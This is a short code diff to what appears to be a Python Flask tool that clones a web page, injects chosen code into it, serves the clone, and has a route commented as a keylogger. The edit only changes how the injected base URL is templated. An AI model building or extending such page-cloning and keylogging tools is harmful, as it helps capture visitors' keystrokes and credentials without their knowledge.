@@ -160,7 +160,7 @@ def link():
 
     #write out clone with chosen code injected
     if not "<base" in jsadd:
-    	jsadd = jsadd.replace("<head>","<head><base href=\""+url+"\"/>")
+    	jsadd = jsadd.replace("<head>","<head><base href='{{url}}'>")
     f.write(jsadd)
     f.close()
     scrpt.close()
@@ -171,7 +171,7 @@ def link():
     keyfile.close()
 
     #serve the cloned page
-    return render_template("page.html")
+    return render_template("page.html", url=url)
 
 #keylogger
 @app.route("/key")
